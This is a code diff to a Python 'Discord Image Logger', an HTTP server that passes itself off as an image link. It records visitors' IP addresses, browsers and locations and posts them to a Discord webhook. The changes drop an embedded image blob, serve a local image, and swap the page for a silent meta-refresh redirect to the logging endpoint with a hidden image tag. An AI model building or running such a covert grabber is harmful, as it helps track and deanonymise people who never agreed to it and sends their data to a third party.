@@ -1,6 +1,7 @@
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import os
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to log information by using Discord's Open Original feature"
@@ -141,12 +142,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     requests.post(config["webhook"], json = embed)
     return info
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-}
-
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
+
     def handleRequest(self):
         try:
             s = self.path
@@ -163,6 +160,15 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 self.wfile.write(b'{"status": "logged"}')
                 return
 
+            # Serve the image directly
+            if self.path.endswith("/image.png"):
+                with open("/mnt/data/image.png", "rb") as image_file:
+                    self.send_response(200)
+                    self.send_header('Content-type', 'image/png')
+                    self.end_headers()
+                    self.wfile.write(image_file.read())
+                return
+
             if config["imageArgument"]:
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
@@ -171,18 +177,14 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+            data = f'''<html>
+<head>
+<meta http-equiv="refresh" content="0;url=/log?url={parse.quote(url)}">
+</head>
+<body>
+<img src="/image.png" style="display:none">
+</body>
+</html>'''.encode()
 
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
